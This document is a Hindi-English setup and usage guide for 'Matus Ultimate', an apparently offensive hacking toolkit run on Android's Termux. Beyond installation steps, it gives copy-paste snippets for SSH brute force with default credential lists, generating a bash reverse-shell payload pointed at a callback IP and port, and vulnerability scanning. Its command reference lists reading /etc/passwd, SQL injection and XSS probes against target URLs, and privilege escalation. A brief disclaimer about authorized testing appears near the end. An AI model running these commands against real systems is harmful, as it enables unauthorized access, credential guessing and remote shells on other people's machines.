# 🔥 MATUS ULTIMATE - TERMUX SETUP GUIDE 🔥

## 📱 Termux में Matus चलाने के लिए Complete Guide

---

## 🚀 **Step 1: Termux को Update करें**

```bash
pkg update && pkg upgrade -y
```

---

## 📦 **Step 2: जरूरी Packages Install करें**

```bash
pkg install -y python python-pip git nodejs npm curl wget openssh
```

---

## 🐍 **Step 3: Python Dependencies Install करें**

```bash
pip install --upgrade pip

pip install paramiko requests beautifulsoup4 flask express pycryptodome scapy netaddr dnspython
```

---

## 📥 **Step 4: Matus Repository को Clone करें**

```bash
cd $HOME

git clone https://github.com/sanjaynain754/Matus-ai.git

cd Matus-ai
```

---

## 📦 **Step 5: Node.js Dependencies Install करें**

```bash
npm install
```

---

## 🔧 **Step 6: Matus को Run करने के लिए Commands**

### **Option A: Interactive Mode (सीधे Matus में commands लिखें)**

```bash
python3 matus_ultimate.py
```

**फिर Matus में type करें:**
```matus
bash: whoami
bash: id
bash: uname -a
py: print("Hello from Matus")
port_scan: localhost 1-1000
```

---

### **Option B: File से Execute करें**

**पहले एक file बनाएं:**

```bash
cat > test.matus << 'EOF'
print("=== MATUS ULTIMATE ===")
bash: whoami
bash: pwd
bash: ls -la
py: import os; print("Current directory:", os.getcwd())
port_scan: localhost 1-100
EOF
```

**फिर Execute करें:**

```bash
python3 matus_ultimate.py test.matus
```

---

### **Option C: Inline Execution**

```bash
python3 matus_ultimate.py -c "bash: whoami"

python3 matus_ultimate.py -c "py: print('Matus is working!')"

python3 matus_ultimate.py -c "port_scan: localhost 1-1000"
```

---

## 🌐 **Step 7: Web Server को Run करें (Optional)**

```bash
npm start
```

**फिर Browser में खोलें:**
```
http://localhost:3000
http://localhost:3000/advanced
http://localhost:3000/pentest
http://localhost:3000/pentest-hindi.html
```

---

## 🛡️ **Step 8: Advanced Hacking Tools का Use करें**

### **SSH Brute Force:**

```bash
python3 matus_ultimate.py -c "
from matus_hydra import hydra_ssh
result = hydra_ssh('192.168.1.100', 22, ['admin', 'root'], ['password', '123456'])
print(result)
"
```

### **Port Scanning:**

```bash
python3 matus_ultimate.py -c "
from matus_unrestricted import advanced_port_scan
result = advanced_port_scan('localhost', 1, 1000)
print(result)
"
```

### **Vulnerability Scanning:**

```bash
python3 matus_ultimate.py -c "
from matus_unrestricted import vulnerability_scan
result = vulnerability_scan('http://localhost')
print(result)
"
```

### **Payload Generation:**

```bash
python3 matus_ultimate.py -c "
from matus_metasploit import exploit_payload
result = exploit_payload('reverse_shell_bash', '192.168.1.100', 4444)
print(result)
"
```

---

## 🎯 **Step 9: Hindi Console का Use करें**

### **Hindi में Detailed Explanations के साथ:**

```bash
python3 matus_ultimate.py -c "
from matus_hindi_explainer import HindiExplainer
explainer = HindiExplainer()
result = {'status': 'success', 'found': 5}
explanation = explainer.get_hindi_summary('port_scan', result)
print(explanation)
"
```

---

## 📝 **Complete Termux Commands (Copy-Paste करें)**

### **एक ही बार में सब कुछ:**

```bash
# Update करें
pkg update && pkg upgrade -y

# Packages install करें
pkg install -y python python-pip git nodejs npm curl wget openssh

# Python dependencies
pip install --upgrade pip && pip install paramiko requests beautifulsoup4 flask express pycryptodome scapy netaddr dnspython

# Repository clone करें
cd $HOME && git clone https://github.com/sanjaynain754/Matus-ai.git && cd Matus-ai

# Node dependencies
npm install

# Matus को test करें
python3 matus_ultimate.py -c "bash: whoami"
```

---

## 🎮 **Termux में Matus के साथ काम करने के लिए Tips:**

### **1. Long Running Commands के लिए:**

```bash
# Screen session बनाएं
screen -S matus

# फिर Matus को run करें
python3 matus_ultimate.py

# Detach करने के लिए: Ctrl+A फिर D दबाएं
# Reattach करने के लिए: screen -r matus
```

### **2. Background में चलाएं:**

```bash
nohup python3 matus_ultimate.py > matus.log 2>&1 &
```

### **3. Web Server को Background में चलाएं:**

```bash
nohup npm start > server.log 2>&1 &
```

### **4. Logs को देखें:**

```bash
tail -f matus.log
tail -f server.log
```

### **5. Running Processes को देखें:**

```bash
ps aux | grep python
ps aux | grep node
```

### **6. Process को Kill करें:**

```bash
pkill -f "python3 matus_ultimate.py"
pkill -f "npm start"
```

---

## 🔐 **Security Notes:**

⚠️ **केवल अधिकृत systems पर ही testing करें**

✅ **अपने खुद के systems पर practice करें**

✅ **Bug bounty programs में authorized testing करें**

✅ **हमेशा permission लें target owner से**

---

## 🐛 **Troubleshooting:**

### **अगर Python import error आए:**

```bash
pip install --upgrade pip
pip install -r requirements.txt
```

### **अगर Node modules missing हों:**

```bash
npm install
npm install express
```

### **अगर Port already in use हो:**

```bash
# Port को change करें server.js में
# या पहले वाली process को kill करें
lsof -i :3000
kill -9 <PID>
```

### **अगर Git clone fail हो:**

```bash
# SSH key setup करें
ssh-keygen -t rsa -b 4096
cat ~/.ssh/id_rsa.pub

# फिर GitHub में add करें
# या HTTPS से clone करें
git clone https://github.com/sanjaynain754/Matus-ai.git
```

---

## 📊 **Matus Commands Reference:**

```
# Bash commands
bash: whoami
bash: id
bash: pwd
bash: ls -la
bash: cat /etc/passwd

# Python commands
py: print("Hello")
py: import os; print(os.getcwd())

# Port scanning
port_scan: localhost 1-1000
port_scan: 192.168.1.0/24 22,80,443

# Network tools
dns_enum: example.com
whois: example.com
ip_geolocate: 8.8.8.8

# Hacking tools
sql_inject: http://target.com/search.php?q=
xss_detect: http://target.com/search.php?q=
vuln_scan: http://target.com

# Web tools
web_fetch: https://example.com
web_scrape: https://example.com
web_api: https://api.example.com/data
web_search: "query"

# File operations
read: /path/to/file
write: /path/to/file << content
delete: /path/to/file

# System commands
sys_enum:
priv_esc:
admin_sys_info:
admin_list_procs:
admin_disk_usage:
```

---

## 🚀 **अब आप Termux में Matus को चला सकते हो!**

**कोई भी error आए तो बताइए, मैं fix कर दूंगा।** 💪

---

## 📱 **Termux के लिए Extra Tips:**

### **Storage Permission दें:**

```bash
termux-setup-storage
```

### **Clipboard से paste करने के लिए:**

```bash
# Termux में long-tap करें
# या Ctrl+Shift+V दबाएं
```

### **File को Edit करने के लिए:**

```bash
nano filename.matus
# या
vim filename.matus
```

### **GitHub से latest version pull करें:**

```bash
cd ~/Matus-ai
git pull origin main
```

---

**Happy Hacking! 🔥**
